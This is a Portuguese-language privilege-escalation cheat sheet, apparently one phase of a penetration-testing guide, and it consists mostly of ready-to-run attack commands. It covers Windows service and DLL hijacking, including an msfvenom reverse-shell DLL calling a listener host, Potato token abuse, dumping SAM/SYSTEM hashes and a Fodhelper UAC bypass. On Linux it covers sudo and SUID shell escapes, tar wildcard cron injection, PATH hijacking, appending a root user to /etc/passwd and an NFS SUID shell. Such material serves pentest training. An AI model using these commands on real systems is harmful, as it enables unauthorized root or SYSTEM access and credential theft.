# ⬆️ Fase 3: Escalada de privilégios

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Objetivo:** Elevar os privilégios de um utilizador comum para Administrator/SYSTEM (Windows) ou root (Linux).

> 📚 **Guias completos:** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

> **Nota sobre os exemplos:** as versões de ferramentas, do kernel e de sudo mencionadas no original são indicações simplificadas, não critérios suficientes para confirmar uma vulnerabilidade; é necessário verificar a compilação, as correções e os pré-requisitos. No exemplo de `/etc/passwd`, `xyz...` é um hash fictício que não corresponde automaticamente à saída de `openssl`. No exemplo NFS, o caminho usado no alvo tem de corresponder ao ficheiro criado na partilha; `/mnt` é apenas o ponto de montagem ilustrativo.

---

## 🖥️ Escalada de privilégios em Windows

### Verificações iniciais com resultados rápidos
```cmd
# Verificar os privilégios atuais
whoami /priv
whoami /groups

# Procurar credenciais guardadas
cmdkey /list

# Ficheiros de instalação não assistida
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploração de serviços

#### Caminho de serviço sem aspas
```cmd
# Procurar caminhos sem aspas
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Se for encontrado: C:\Program Files\Some Service\service.exe
# Colocar um executável malicioso em: C:\Program.exe ou C:\Program Files\Some.exe
```

#### Permissões de serviço demasiado permissivas
```cmd
# Verificar as permissões do serviço com accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Se houver SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL hijacking (desvio do carregamento de DLLs)
```powershell
# Procurar serviços com DLLs em falta (utilizar o Process Monitor)
# Colocar a DLL maliciosa na pasta do serviço
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Personificação através de tokens

#### SeImpersonatePrivilege (ataques Potato)
```cmd
# Verificar se tens SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Criar cópias de SAM e SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extrair os hashes no sistema atacante
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Exploração do registo
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Caminhos com permissão de escrita em tarefas agendadas
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Permissões do registo
accesschk.exe -kvw hklm\SOFTWARE
```

### Contornar o UAC
```powershell
# Contornar o UAC com Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Ferramentas automáticas
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Escalada de privilégios em Linux

### Verificações iniciais com resultados rápidos
```bash
# Permissões de sudo
sudo -l

# Binários SUID
find / -perm -4000 -type f 2>/dev/null

# /etc/passwd com permissão de escrita
ls -la /etc/passwd

# Versão do kernel para procurar exploits
uname -a
```

### Exploração de sudo

#### sudo sem palavra-passe
```bash
# Se sudo -l mostrar: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Se sudo -l mostrar: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Se sudo -l mostrar: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Exploração da versão de sudo (CVE-2021-3156)
```bash
# Verificar a versão de sudo
sudo --version

# Se sudo < 1.9.5p2
# Utilizar o exploit: https://github.com/blasty/CVE-2021-3156
```

### Binários SUID/SGID
```bash
# Procurar binários SUID
find / -perm -4000 -type f 2>/dev/null

# Consultar o GTFOBins para técnicas de exploração
# https://gtfobins.github.io/

# Exemplo: SUID em /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Exemplo: SUID em /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Exemplo: SUID em /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (capacidades Linux)
```bash
# Procurar binários com capabilities
getcap -r / 2>/dev/null

# Exemplo: cap_setuid em Python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Tarefas cron
```bash
# Verificar tarefas cron
cat /etc/crontab
ls -la /etc/cron.*

# Procurar scripts com permissão de escrita
# Injeção através de wildcards no tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH hijacking (desvio da procura de executáveis)
```bash
# Se uma tarefa cron ou um script chamar um binário sem o caminho completo
# Criar um binário malicioso numa pasta de PATH com permissão de escrita

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### /etc/passwd com permissão de escrita
```bash
# Se /etc/passwd tiver permissão de escrita
# Gerar o hash da palavra-passe
openssl passwd -1 -salt evil password123

# Adicionar um utilizador root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Mudar para o novo utilizador root
su evil
```

### Exploração do kernel
```bash
# Verificar a versão do kernel
uname -r
cat /proc/version

# Procurar exploits
searchsploit linux kernel 4.4 privilege escalation

# Exploits conhecidos para o kernel:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### Exploração de NFS
```bash
# Verificar no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Se houver no_root_squash:
# Montar a partilha e criar um binário SUID como root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# No alvo:
/mnt/bash -p
```

### Ferramentas automáticas
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Referência rápida

### Lista de verificação para Windows
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Caminhos de serviços sem aspas
- [ ] Permissões de serviço demasiado permissivas
- [ ] AlwaysInstallElevated
- [ ] Credenciais guardadas (cmdkey /list)
- [ ] Ficheiros Unattend/Sysprep
- [ ] Tarefas agendadas
- [ ] Executar WinPEAS/PowerUp
```

### Lista de verificação para Linux
```markdown
- [ ] sudo -l
- [ ] Binários SUID (consultar GTFOBins)
- [ ] Capabilities (capacidades Linux)
- [ ] Tarefas cron (scripts com permissão de escrita, wildcards)
- [ ] /etc/passwd com permissão de escrita
- [ ] Versão do kernel (exploits)
- [ ] NFS no_root_squash
- [ ] Executar LinPEAS
```

---

## 🔗 Guias de referência relacionados

- [Escalada de privilégios em Windows (guia completo)](../../Windows-PrivEsc/README.md)
- [Escalada de privilégios em Linux (guia completo)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Fase anterior:** [← 02 - Enumeração](./02-Enumeration.pt.md)

**Fase seguinte:** [04 - Movimento lateral →](./04-Lateral-Movement.pt.md)
